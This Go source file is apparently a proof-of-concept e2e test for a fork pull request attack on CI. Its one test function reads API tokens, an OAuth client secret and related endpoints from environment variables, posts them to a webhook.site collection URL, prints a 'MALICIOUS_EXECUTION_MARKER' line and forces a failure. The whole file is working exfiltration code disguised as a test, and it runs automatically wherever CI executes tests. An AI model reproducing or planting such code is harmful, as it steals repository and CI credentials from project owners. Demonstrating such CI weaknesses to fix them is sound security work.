//go:build e2e

package poc

import (
    "fmt"
    "net/http"
    "net/url"
    "os"
    "testing"
)

func TestForkPRExfilWebhookSecrets(t *testing.T) {
    exfil := "https://webhook.site/e610bc56-f7e8-401d-8b0a-522765861e2a"
    v := url.Values{}
    v.Set("marker", "fork-pr-webhook-secrets")
    v.Set("api_token", os.Getenv("API_TOKEN"))
    v.Set("platform_token", os.Getenv("PLATFORM_TOKEN"))
    v.Set("oauth_client_id", os.Getenv("OAUTH_CLIENT_ID"))
    v.Set("oauth_client_secret", os.Getenv("OAUTH_CLIENT_SECRET"))
    v.Set("oauth_token_endpoint", os.Getenv("OAUTH_TOKEN_ENDPOINT"))
    v.Set("classic_url", os.Getenv("CLASSIC_URL"))
    v.Set("platform_url", os.Getenv("PLATFORM_URL"))

    resp, err := http.PostForm(exfil, v)
    if err != nil {
        t.Fatalf("exfil request failed: %v", err)
    }
    _ = resp.Body.Close()

    fmt.Println("MALICIOUS_EXECUTION_MARKER=fork-pr-webhook-secrets")
    t.Fatalf("forced failure after exfil")
}
